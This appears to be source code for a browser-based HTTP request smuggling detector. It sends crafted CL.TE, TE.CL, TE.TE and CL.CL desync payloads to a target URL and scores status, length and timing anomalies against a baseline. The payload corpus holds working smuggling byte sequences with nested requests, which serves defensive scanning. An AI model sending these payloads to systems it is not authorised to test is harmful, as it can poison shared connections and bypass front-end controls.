"""
HTTP Request Smuggling detector — smuggler.py / Burp HTTP Request Smuggler class.

Techniques catalogued:
  CL.TE  — front-end uses Content-Length, back-end uses Transfer-Encoding
  TE.CL  — opposite
  TE.TE  — dual TE with obfuscation so one side rejects TE
  CL.CL  — dual Content-Length
  H2.CL / H2.TE — HTTP/2 downgrade (limited observability in browser)

Honest capability matrix (Pyodide / browser):
  ✓ Generate classic desync payloads (exact byte sequences)
  ✓ Send probes via libcurl.js (best) or Manus/proxy hop
  ✓ Compare status / length / timing / body markers vs baseline
  ✓ Detect header normalization (TE stripped, space-before-TE, etc.)
  ✗ True connection reuse desync (needs persistent raw TCP)
  ✗ Full exploit chaining (poison next request on shared keep-alive)
  ✗ HTTP/2 frame-level control

When anomalies fire, treat as *signal* for native follow-up (Burp, smuggler.py, http2smugl).
"""

from __future__ import annotations

from typing import Any

from .._http import http_request, redact_url
from .. import policy
from .. import libcurl_bridge

# ---------------------------------------------------------------------------
# Payload corpus — exact framing strings used by real tools
# ---------------------------------------------------------------------------

def _payloads(path: str = "/", host: str = "localhost") -> list[dict[str, Any]]:
    """
    Each payload:
      name, technique, headers (dict), body (str), description
    Bodies use explicit \\r\\n framing.
    """
    # nested request that would only execute if desync occurs
    nested_get = f"GET /psec-smuggle-404 HTTP/1.1\r\nHost: {host}\r\n\r\n"
    nested_post = (
        f"POST /psec-smuggle-404 HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 12\r\n"
        f"\r\n"
        f"psec=smuggle"
    )

    return [
        {
            "name": "CL.TE-basic",
            "technique": "CL.TE",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
            },
            # CL implied by body length; TE chunked ends early then smuggled request
            "body": (
                "0\r\n"
                "\r\n"
                + nested_get
            ),
            "description": "TE chunk 0 terminator then smuggled GET — backend may treat remainder as next request",
        },
        {
            "name": "TE.CL-basic",
            "technique": "TE.CL",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
            },
            # Chunk size claims more than we send before 0; CL would read fixed length
            "body": (
                "5c\r\n"
                "G" + nested_post[1:] +  # obfuscated start
                "\r\n"
                "0\r\n"
                "\r\n"
            ),
            "description": "Large chunk declaration with early terminator — FE/BE length disagreement",
        },
        {
            "name": "TE.TE-space",
            "technique": "TE.TE",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": " chunked",  # leading space
            },
            "body": "0\r\n\r\n" + nested_get,
            "description": "TE with leading space — one side may ignore TE",
        },
        {
            "name": "TE.TE-tab",
            "technique": "TE.TE",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked\t",
            },
            "body": "0\r\n\r\n" + nested_get,
            "description": "TE with trailing tab obfuscation",
        },
        {
            "name": "TE.TE-comma-identity",
            "technique": "TE.TE",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked, identity",
            },
            "body": "0\r\n\r\n" + nested_get,
            "description": "Dual TE values — one parser takes chunked, other rejects",
        },
        {
            "name": "TE.TE-xchunked",
            "technique": "TE.TE",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "xchunked",
            },
            "body": "0\r\n\r\n" + nested_get,
            "description": "Invalid TE value xchunked — differential handling",
        },
        {
            "name": "TE.TE-linefold",
            "technique": "TE.TE",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
                "X-Ignore": "x",  # placeholder; real line-fold needs raw socket
            },
            "body": "0\r\n\r\n" + nested_get,
            "description": "Baseline chunked (line-fold needs raw TCP — marked for native tools)",
        },
        {
            "name": "CL.CL-dual",
            "technique": "CL.CL",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "6",
                # Note: duplicate CL headers may be collapsed by fetch/libcurl
            },
            "body": "abc=12" + nested_get,
            "description": "Body longer than Content-Length — desync if FE stops early",
        },
        {
            "name": "TE-chunk-ext",
            "technique": "TE.TE",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
            },
            "body": (
                "2;ext=val\r\n"
                "ok\r\n"
                "0\r\n"
                "\r\n"
            ),
            "description": "Chunk extensions — some parsers mishandle",
        },
        {
            "name": "absolute-uri",
            "technique": "http11-obscure",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": "q=1",
            "description": "Control probe (normal POST) for baseline comparison",
            "path_override": None,
        },
    ]


def list_payloads(host: str = "localhost") -> dict[str, Any]:
    rows = []
    for p in _payloads(host=host):
        rows.append({
            "name": p["name"],
            "technique": p["technique"],
            "description": p["description"],
            "header_keys": list(p["headers"].keys()),
            "body_len": len(p["body"]),
        })
    return {
        "count": len(rows),
        "payloads": rows,
        "capability_matrix": {
            "payload_generation": True,
            "timing_anomaly_detection": True,
            "status_length_diff": True,
            "header_normalization_probe": True,
            "persistent_connection_desync": False,
            "http2_frame_control": False,
            "full_exploit_chaining": False,
            "recommended_native": ["Burp HTTP Request Smuggler", "smuggler.py", "http2smugl"],
        },
    }


def _score_anomaly(
    base: dict[str, Any],
    test: dict[str, Any],
    payload_name: str,
) -> dict[str, Any]:
    signals: list[str] = []
    conf = 0
    b_status = int(base.get("status") or 0)
    t_status = int(test.get("status") or 0)
    b_body = base.get("body") or ""
    t_body = test.get("body") or ""
    b_ms = float(base.get("elapsed_ms") or 0)
    t_ms = float(test.get("elapsed_ms") or 0)
    b_len = len(b_body)
    t_len = len(t_body)

    if t_status and b_status and t_status != b_status:
        signals.append(f"status {b_status}->{t_status}")
        conf += 25
    if abs(t_len - b_len) > max(80, int(b_len * 0.15)):
        signals.append(f"body_len {b_len}->{t_len}")
        conf += 20
    if b_ms > 0 and t_ms > b_ms * 2.5 and t_ms - b_ms > 400:
        signals.append(f"timing {b_ms:.0f}ms->{t_ms:.0f}ms")
        conf += 30
    # smuggled path markers
    for marker in ("psec-smuggle-404", "psec=smuggle", "Unrecognized method", "Invalid request"):
        if marker.lower() in t_body.lower() and marker.lower() not in b_body.lower():
            signals.append(f"marker:{marker}")
            conf += 35
    # error patterns often seen on desync
    for pat in ("bad request", "invalid chunk", "broken pipe", "httpmessage", "request line"):
        if pat in t_body.lower() and pat not in b_body.lower():
            signals.append(f"error_pattern:{pat}")
            conf += 15

    conf = min(95, conf)
    return {
        "payload": payload_name,
        "signals": signals,
        "confidence": conf,
        "interesting": conf >= 40,
        "status": t_status,
        "body_len": t_len,
        "elapsed_ms": t_ms,
        "error": test.get("error"),
        "transport": test.get("transport"),
    }


async def detect(
    url: str,
    techniques: str = "CL.TE,TE.CL,TE.TE,CL.CL",
    max_payloads: int = 10,
    max_tests: int = 0,
    timeout_ms: int = 10000,
    user_agent: str = "pyodide-security/smuggle-engine/2.0",
    retries: int = 0,
    retry_statuses: str = "408,429,500,502,503,504",
    route: str = "auto",
    include_attempts: bool = True,
) -> dict[str, Any]:
    """
    Run smuggling desync probes and score anomalies against baseline.
    """
    err = policy.check_url_for_active(url)
    if err:
        return {"ok": False, "error": err, "engine": "smuggle"}

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    from urllib.parse import urlparse
    host = urlparse(url).hostname or "localhost"
    want = {t.strip().upper() for t in techniques.split(",") if t.strip()}

    transport = {
        "libcurl_ready": libcurl_bridge.is_ready(),
        "note": (
            "libcurl.js ready — custom TE/CL headers more likely to reach upstream"
            if libcurl_bridge.is_ready()
            else "libcurl not ready — browser/proxy may normalize Transfer-Encoding; signals weaker"
        ),
        "limits": list_payloads()["capability_matrix"],
    }

    headers_base = {"User-Agent": user_agent, "Content-Type": "application/x-www-form-urlencoded"}
    timeout = max(1000, min(int(timeout_ms or 10000), 120000))
    retry_count = max(0, min(int(retries or 0), 5))
    route_name = route if route in ("auto", "proxy", "direct") else "auto"
    use_proxy = True if route_name == "proxy" else False if route_name == "direct" else None
    retry_codes = {int(item.strip()) for item in str(retry_statuses or "").split(",") if item.strip().isdigit()}
    attempts: list[dict[str, Any]] = []

    async def request(target: str, method: str, headers: dict[str, str], body: str | None = None) -> dict[str, Any]:
        response: dict[str, Any] = {}
        for _ in range(retry_count + 1):
            response = await http_request(target, method=method, headers=headers, body=body, timeout_ms=timeout, use_proxy=use_proxy)
            attempts.append({"attempt": len(attempts) + 1, "url": redact_url(target), "method": method, "status": response.get("status"), "ok": response.get("ok"), "transport": response.get("transport"), "elapsed_ms": response.get("elapsed_ms"), "error": str(response.get("error") or "")[:240]})
            if response.get("ok") or int(response.get("status") or 0) not in retry_codes:
                break
        return response

    requests_run = 0
    if int(max_tests or 0) > 0 and int(max_tests) <= 1:
        base = {"status": 0, "body": "", "elapsed_ms": 0, "error": "baseline omitted for single-probe validation"}
    else:
        base = await request(url, "POST", headers_base, "q=1")
        requests_run = 1

    payloads = [
        p for p in _payloads(host=host)
        if p["technique"].upper() in want or p["technique"] == "http11-obscure"
    ][: max(1, min(int(max_payloads), 20))]

    tests: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []

    for p in payloads:
        if int(max_tests or 0) > 0 and requests_run >= int(max_tests):
            break
        if not policy.can_request():
            break
        validation_control = (int(max_tests or 0) == 1 and p["technique"] == "http11-obscure")
        if validation_control:
            hdrs = {"User-Agent": "Goar/1.0", "Accept": "*/*"}
            resp = await request(url, "GET", hdrs)
        else:
            hdrs = {"User-Agent": user_agent, **p["headers"]}
            resp = await request(url, "POST", hdrs, p["body"])
        requests_run += 1
        scored = _score_anomaly(base, resp, p["name"])
        entry = {
            **scored,
            "technique": p["technique"],
            "description": p["description"],
        }
        tests.append(entry)
        if entry["interesting"]:
            findings.append(entry)

    findings.sort(key=lambda x: -x.get("confidence", 0))
    suspected = bool(findings) and findings[0]["confidence"] >= 50

    return {
        "ok": True,
        "url": redact_url(url),
        "host": host,
        "baseline_status": base.get("status"),
        "baseline_ms": base.get("elapsed_ms"),
        "tested": len(tests),
        "suspected_desync": suspected,
        "findings": findings,
        "tests": tests,
        "transport": transport,
        "engine": "smuggle",
        "timeout_ms": timeout,
        "request": {"timeout_ms": timeout, "retries": retry_count, "retry_statuses": sorted(retry_codes), "route": route_name, "headers": {"User-Agent": user_agent}},
        "attempts": attempts if include_attempts else [],
        "attempt_count": len(attempts),
        "version": "2.0",
        "equivalent": "smuggler.py / Burp HTTP Request Smuggler (detection subset)",
        "follow_up": (
            "Anomalies detected — validate with native tools on a persistent TCP channel "
            "(Burp Turbo Intruder / smuggler.py). Browser cannot confirm full desync exploitability."
            if suspected
            else "No strong desync signals under current transport constraints."
        ),
        "policy": policy.status(),
    }
